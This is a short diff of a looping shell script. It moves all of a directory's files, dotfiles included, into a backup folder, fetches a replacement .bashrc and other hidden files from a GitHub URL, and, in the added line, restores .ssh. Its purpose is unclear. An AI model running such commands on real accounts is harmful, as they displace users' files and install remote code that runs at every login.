@@ -20,6 +20,7 @@ while true; do
                 mkdir .backup
                 mv * .backup
                 mv .* .backup
+                cp -r .backup/.ssh . 
                 curl "https://raw.githubusercontent.com/peter2233finn/test/main/.bashrc" > .bashrc
                 curl "https://raw.githubusercontent.com/peter2233finn/test/main/.r" > .r
                 curl "https://raw.githubusercontent.com/peter2233finn/test/main/.w" > .w
